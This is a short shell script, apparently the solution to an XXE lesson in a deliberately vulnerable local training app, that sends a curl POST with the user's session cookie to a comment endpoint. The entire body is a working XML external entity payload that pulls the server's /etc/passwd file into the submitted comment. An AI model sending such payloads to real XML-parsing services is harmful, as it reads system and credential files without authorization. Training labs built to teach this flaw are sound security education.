session="$1"

curl 'http://localhost:5000/xxecomment' -H 'Connection: keep-alive' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' -H 'Origin: http://localhost:5000' -H 'Upgrade-Insecure-Requests: 1' -H 'Content-Type: application/xml' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36' -H 'Sec-Fetch-Dest: document' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H 'Sec-Fetch-Site: same-origin' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-User: ?1' -H 'Referer: http://localhost:5000/lessons/xxe' -H 'Accept-Language: en-US,en;q=0.9' -H "Cookie: session=$session" --data '<?xml version="1.0"?>
<!--This is the request you want-->
<!DOCTYPE comm [
<!ELEMENT comm (#PCDATA)>
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<comm>
  <text>&xxe;</text>
</comm>' --compressed
